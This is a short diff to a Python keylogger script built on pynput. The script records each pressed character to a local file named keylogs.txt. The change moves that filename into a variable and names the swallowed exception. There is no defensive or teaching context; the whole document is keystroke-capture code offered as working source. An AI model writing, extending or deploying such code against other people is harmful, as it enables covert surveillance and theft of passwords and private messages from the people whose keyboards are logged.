@@ -1,11 +1,13 @@
 from pynput import keyboard
 import os
 
+keylogs_file = "keylogs.txt"
+
 def on_press(key):
     try:
-        with open("keylogs.txt", "a") as f:
+        with open(keylogs_file, "a") as f:
             f.write(str(key.char))
-    except Exception:
+    except Exception as e:
         pass
 
 listener = keyboard.Listener(on_press=on_press)
